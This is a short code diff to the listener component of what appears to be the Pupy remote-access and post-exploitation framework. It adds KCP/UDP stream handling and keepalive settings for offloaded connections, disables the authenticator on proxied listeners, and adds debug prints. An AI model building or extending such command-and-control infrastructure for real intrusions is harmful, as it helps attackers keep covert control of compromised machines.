@@ -28,7 +28,7 @@ from .PupyCompile import pupycompile
 from network.conf import transports
 from network.lib.connection import PupyConnectionThread
 from network.lib.servers import PupyTCPServer
-from network.lib.streams.PupySocketStream import PupySocketStream
+from network.lib.streams.PupySocketStream import PupySocketStream, PupyUDPSocketStream
 from pupylib.utils.rpyc_utils import obtain
 from pupylib.utils.network import get_listener_ip_with_local
 from pupylib.PupyDnsCnc import PupyDnsCnc
@@ -59,6 +59,11 @@ import os.path
 
 class ListenerException(Exception):
     pass
+
+class PupyKCPSocketStream(PupySocketStream):
+    def __init__(self, *args, **kwargs):
+        PupySocketStream.__init__(self, *args, **kwargs)
+        self.KEEP_ALIVE_REQUIRED = 15
 
 class Listener(Thread):
     def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None):
@@ -218,15 +223,19 @@ class Listener(Thread):
                 proxy = PupyOffloadManager(offload_server, offload_psk)
 
                 print "ORIGINAL STREAM: ", stream, type(stream)
+                print "ORIGINAL AUTHENTICATOR: ", authenticator, type(authenticator)
 
-                stream = PupySocketStream
+                if stream == PupyUDPSocketStream:
+                    stream = PupyKCPSocketStream
+                    method = proxy.kcp
+                else:
+                    method = proxy.tcp
+
                 server = PupyTCPServer
 
+                authenticator = None
                 ipv6 = False
                 igd = None
-
-                method = proxy.kcp
-                print "METHOD: ", method
 
         self.server = server(
             PupyService,
